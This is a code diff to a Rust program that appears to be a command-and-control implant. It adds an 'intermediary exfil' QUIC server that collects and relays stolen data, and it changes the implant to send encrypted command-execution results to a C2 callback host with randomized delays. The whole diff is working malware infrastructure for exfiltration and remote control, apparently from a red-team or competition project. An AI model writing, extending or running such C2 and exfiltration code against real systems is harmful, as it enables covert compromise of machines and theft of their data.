@@ -2,7 +2,7 @@ use c2::*;
 
 use crate::{
     c2syncer::{C2Syncer, c2sync, new_quic_client, run_c2syncer},
-    common::{Aes256ShareMessage, C2Client, CommandExecutionMessage, FastChannelMessage},
+    common::{Aes256ShareMessage, C2Client, CommandExecutionMessage, FastChannelMessage, FastChannelMessageType},
     policy::{Effect, get_owner_key},
 };
 use aes::{
@@ -26,6 +26,8 @@ use std::{
 };
 use tokio::sync::Mutex;
 use tokio::time::{Duration, sleep};
+use s2n_quic::{Client as QuicClient, Connection, Server, client::Connect, provider::limits::Limits};
+use bytes::Bytes;
 
 struct C2Sink {
     pub commands: Vec<String>,
@@ -94,6 +96,65 @@ fn generate_random_directory() -> PathBuf {
     return std::env::temp_dir().join(Path::new(std::str::from_utf8(&randdir).unwrap()));
 }
 
+async fn run_intermediary_exfil(mut bind: SocketAddr) {
+    bind.set_port(4447);
+    let mut server = Server::builder()
+        .with_tls((config::CERTIFICATE, config::KEY))
+        .unwrap()
+        .with_io(bind)
+        .unwrap()
+        .with_endpoint_limits(
+            s2n_quic::provider::endpoint_limits::Default::builder()
+            .with_inflight_handshake_limit(10000)
+            .unwrap()
+            .build()
+            .unwrap()
+        )
+        .unwrap()
+        .start()
+        .unwrap();
+
+    let mut stored_data = Arc::new(Mutex::new(Vec::new()));
+
+    while let Some(mut connection) = server.accept().await {
+        let stored_data = stored_data.clone();
+        tokio::spawn(async move {
+            while let Ok(Some(mut stream)) = connection.accept_bidirectional_stream().await {
+                let Ok(addr) = stream.connection().remote_addr() else {
+                    // println!("I couldnt parse ip");
+                    continue;
+                };
+
+                let mut req = Vec::new();
+                while let Ok(Some(r)) = stream.receive().await {
+                    req.extend_from_slice(&r);
+                }
+
+                if let Ok(data) = postcard::from_bytes::<FastChannelMessage>(&req) {
+                    match data.msgtype {
+                        FastChannelMessageType::DATA => {
+                            Arc::clone(&stored_data).lock().await.push(data);
+                            println!("STORED DATA!!");
+                        },
+                        FastChannelMessageType::REQUEST_DATA => {
+                            println!("SENDING DATA NOW LOOLLL");
+
+                            println!("STORED DATA LENGTH: {}", stored_data.lock().await.len());
+                            let data = postcard::to_allocvec(&stored_data.lock().await.clone())
+                                .expect("Cannot serialise stored data");
+                            if let Err(err) = stream.send(data.into()).await {
+                                println!("Failed to send stored data: {err}");
+                                continue;
+                            }
+                            let _ = stream.finish();
+                        }
+                    }
+                }
+            }
+        });
+    }
+}
+
 fn main() {
     // Enable logging to terminal
     tracing_subscriber::fmt().init();
@@ -122,7 +183,7 @@ fn main() {
     let cs = aranya.init_aranya(policy);
 
     // let graph = GraphId::from_bytes(config::GRAPH_BIN.try_into().unwrap());
-    let graph = GraphId::from_str("CBMzhUKiyrKkdN8iZRRzrVLcLkbTgJCHPF9415HkZX23").unwrap();
+    let graph = GraphId::from_str("HS27WDbS4eX3SzqGrbSR3GKCMpryZZKf4hcd4DkbLMtZ").unwrap();
     aranya.set_graph(graph);
 
     let mut syncer = C2Syncer::new(cs, sink);
@@ -174,7 +235,7 @@ fn main() {
         tokio::spawn(run_c2syncer(Arc::clone(&syncer), Arc::clone(&quic), bind));
 
         // TODO: LOL i mean, it takes like 10 tries for it to 'parse peers' idk
-        for i in 1..10 {
+        for i in 1..4 {
             for ip in &ips {
                 c2sync(
                     SocketAddr::new(*ip, config::PORT),
@@ -184,7 +245,10 @@ fn main() {
                 )
                 .await;
             }
+            sleep(Duration::from_millis(100)).await;
         }
+
+        println!("CONNS: {:?}", Arc::clone(&syncer).lock().await.connections);
 
         let machineid = match machine_id::get_machine_id() {
             Ok(v) if v.len() > 0 => v,
@@ -194,6 +258,10 @@ fn main() {
                 hex::encode(bytes)
             }
         };
+
+        tokio::spawn(async move {
+            run_intermediary_exfil(bind.clone()).await;
+        });
 
         loop {
             sleep(Duration::from_millis(1000)).await;
@@ -222,8 +290,8 @@ fn main() {
                     continue;
                 };
 
-                println!("{:?}", info.callback);
-                println!("{:?}", info.pubkey);
+                // println!("{:?}", info.callback);
+                // println!("{:?}", info.pubkey);
 
                 let Some(callback) = info.callback else {
                     continue;
@@ -253,6 +321,8 @@ fn main() {
 
                 let mut rng = Rng;
                 let message = FastChannelMessage {
+                    msgtype: FastChannelMessageType::DATA,
+                    originip: bind,
                     share: ownerkey
                         .encrypt(
                             &mut rng,
@@ -273,16 +343,43 @@ fn main() {
                 let Some(ref callback) = sink.callback else {
                     continue;
                 };
-
-                // TODO: Can cause unecessary blocking ?
-                let Ok(mut stream) = TcpStream::connect(callback) else {
-                    println!("Failed to connect to callback");
-                    continue;
-                };
-
+                
                 let data = postcard::to_allocvec(&message).expect("Could not serialise message");
+                // TODO: Can cause unecessary blocking ?
+                // let Ok(mut stream) = TcpStream::connect(callback) else {
+                //     println!("Failed to connect to callback");
+                //     continue;
+                // };
 
-                stream.write(&data);
+                let mut bindc = bind.clone();
+                bindc.set_port(0);
+
+                let client = QuicClient::builder()
+                    .with_tls(config::CERTIFICATE)
+                    .unwrap()
+                    .with_io(bindc)
+                    .unwrap()
+                    .start()
+                    .unwrap();
+                
+                use rand::Rng;
+                let mut rng = rand::rng();
+                let number = rng.random_range(100..=2000);
+
+                tokio::time::sleep(Duration::from_millis(number));
+                if let Ok(mut conn) = client.connect(
+                    Connect::new(callback.parse::<SocketAddr>().expect("Lol")).with_server_name("localhost")
+                ).await {
+                    if let Ok(mut stream) = conn.open_bidirectional_stream().await {
+                        if let Err(e) = stream.send(Bytes::from(data)).await {
+                            println!("NOT WRITTEN {e}");
+                        } else {
+                            println!("WRITTEN -----------------------------");
+                        }
+                    }
+                }
+
+                // stream.write(&data);
             }
         }
     });
